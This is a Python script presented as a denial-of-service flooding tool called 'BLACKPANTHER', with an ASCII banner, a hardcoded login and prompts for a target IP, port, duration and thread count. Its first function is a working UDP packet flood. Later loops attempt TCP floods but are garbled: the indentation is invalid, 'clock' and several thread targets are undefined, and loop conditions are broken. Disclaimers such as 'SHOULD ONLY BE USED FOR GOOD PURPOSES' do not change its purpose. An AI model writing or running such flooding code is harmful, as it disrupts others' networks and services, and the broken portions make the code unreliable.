# -*- coding: utf-8 -*-
import random
import socket
import threading
import os
import sys
import time
import fade
os.system("clear")

# Colors
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    UNDERLINE = '\033[4m'
    PURPLE = '\033[97m'
    BOLD    = "\033[1m"
    BLACK   = "\033[30m"
    RED     = "\033[31m"
    GREEN   = "\033[32m"
    YELLOW  = "\033[33m"
    BLUE    = "\033[34m"
    MAGENTA = "\033[35m"
    CYAN    = "\033[36m"
    WHITE   = "\033[37m"

attemps = 0
os.system("clear")
print("")
print("\033[95m        @ @ @ @ @    @     @ @ @ @ @ @ @    @ @ @  @       @  \033[0m")
print("\033[95m        @         @  @      @         @   @        @     @    \033[0m")
print("\033[95m        @         @  @       @       @   @         @   @      \033[0m")
print("\033[31m        @ @ @ @ @    @        @     @    @         @ @        \033[0m")
print("\033[31m        @         @  @         @   @     @         @   @      \033[0m")   
print("\033[31m        @         @  @          @ @       @        @     @    \033[0m")
print("\033[31m        @ @ @ @ @    @ @ @ @ @   @          @ @ @  @       @  \033[0m")
print("")     
print("\033[91m      @ @ @      @ @   @     @ @ @ @ @ @     @  @ @ @  @ @ @    \033[0m")
print("\033[91m            @  @     @ @ @   @    @    @     @  @      @     @  \033[0m")
print("\033[94m      @ @ @    @ @ @ @ @   @ @    @    @ @ @ @  @ @ @  @ @ @    \033[0m")
print("\033[94m      @        @     @ @     @    @    @     @  @ @ @  @     @  \033[0m")
print("")
print("\033[94m_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—__\033[0m")
print("\033[95m             SHOULD ONLY BE USED FOR GOOD PURPOSES                      \033[0m")
print("\033[94m—_—_—_—_—_—_—_—_—_—_—_—_—_——_—_—_—_—_—_—_—_—_—_—_—_—_—_——_—_—_—__—\033[0m")
while attemps < 100:
    username = input('\033[33mEnter your username: \033[0m')
    password = input('\033[94mEnter your password: \033[0m')

    if username == 'n0lk0ma' and password == 'n0lk0ma':
        print('Hei...!! kamu berhasil login di BLACKPANTHER!!')
        break
    else:
        print('Incorrect credentials. Check if you have Caps lock on and try again.')
        attemps += 1
        continue


ip = str(input("\033[94mTarget IP :  \033[0m"))
port = int(input("\033[97mTarget Port :  \033[0m"))
choice = str(input("\033[31m (y/n) :  \033[0m"))
times = int(input("\033[96mTime : \033[0m"))
threads = int(input("\033[92mThreads :  \033[0m"))
time.sleep(5),
print("\033[96m               ⟩⟩  ANTI RACIST \033[0m "),
time.sleep(5),
print("\033[92m               ⟩⟩  ANTI TERRORIST \033[0m "),
time.sleep(5),
print("\033[1m               ⟩⟩  ANTI OPPRESSION \033[0m "),
time.sleep(5),
print("\033[97m               ⟩⟩  ANTI GENOCIDE \033[0m "),
time.sleep(5),
print("\033[95m               ⟩⟩  FUCK U MURDER \033[0m "),
time.sleep(5),

ip = str(input(" Target IP :"))
port = int(input(" Target Port :"))
choice = str(input(" (y/n) :"))
times = int(input(" Time :"))
threads = int(input(" Threads :"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[+]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"Attack Sent!!!")
		except:
			print("[!] Error!!!")

while run:

    clock.tick(2)
	 data = random._urandom(20000)
         i = random.choice(("[+]"))
         while True:
		 try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        s.sendto(bytes, (ip,port))
                        s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"Attack Sent!!!")
		 except:
			print("[!] Error!!!")



    



while run:

    clock.tick(3)
	data = random._urandom(999)
	i = random.choice(("[+]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"Attack Sent!!!")
		except:
			s.close()
			print("[*] Error!!!")
            

while run:

    clock.tick(4)
	data = random._urandom(818)
	i = random.choice(("[+]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"Attack Sent!!!")
		except:
			s.close()
			print("[-] Error!!!")
            
  
while run:

    clock.tick(5)
	data = random._urandom(16)
	i = random.choice(("[+]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"Attack Sent!!!")
		except:
			s.close()
			print("[-] Error!!!")


for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
		th = threading.Thread(target = run4)
		th.start()
else:
		th = threading.Thread(target = run5)
		th.start()



